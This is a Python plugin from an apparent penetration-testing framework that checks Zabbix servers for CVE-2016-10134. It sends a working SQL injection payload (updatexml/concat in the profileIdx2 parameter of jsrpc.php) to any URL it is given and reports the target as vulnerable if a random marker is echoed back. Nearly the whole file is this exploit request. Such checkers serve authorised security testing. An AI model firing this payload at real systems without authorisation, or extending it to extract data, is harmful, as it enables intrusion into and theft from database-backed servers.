import argparse
import random
from copy import copy

import requests

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginZabbixCVE_2016_1134(PluginAdExploitBase):
    display = "Zabbix CVE-2016-10134"
    alias = "zx_cve_2016_10134"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display
        parser.add_argument("-u", "--url", help="target url", required=True, dest="url")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        key = random.random() * 20000000
        resp = requests.get(f"{args.url}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,{key}),0)")

        if resp.status_code == 200 and str(key) in resp.text:
            output.success(f"{args.url} is vulnerable")

        return result
